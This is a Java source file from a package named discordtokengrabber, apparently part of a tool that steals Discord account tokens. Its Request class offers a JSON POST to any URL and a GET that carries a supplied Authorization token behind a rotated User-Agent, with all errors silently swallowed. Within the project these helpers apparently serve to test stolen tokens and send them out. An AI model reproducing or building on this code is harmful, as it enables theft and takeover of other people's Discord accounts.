package com.github.dedinc.discordtokengrabber.utils;

import org.json.JSONObject;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Request {
    public String post(String url, JSONObject json) {
        try {
            final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
            OkHttpClient client = new OkHttpClient();
            RequestBody body = RequestBody.create(JSON, json.toString());
            okhttp3.Request request = new okhttp3.Request.Builder()
                    .url(url)
                    .post(body)
                    .build();;
            Response response = client.newCall(request).execute();
            return response.body().string();
        } catch (Exception e) {
        }
        return null;
    }

    public String get(String url, String token) {
        try {
            OkHttpClient client = new OkHttpClient();
            okhttp3.Request req;
            if (token == null) {
                req = new okhttp3.Request.Builder()
                        .url(url)
                        .build();
            } else {
                req = new okhttp3.Request.Builder()
                        .url(url)
                        .header("User-Agent", Helper.getUserAgents().getAgent())
                        .header("Authorization", token)
                        .build();
            }
            Response res = client.newCall(req).execute();
            return res.body().string();
        } catch (Exception e) {
        }
        return null;
    }
}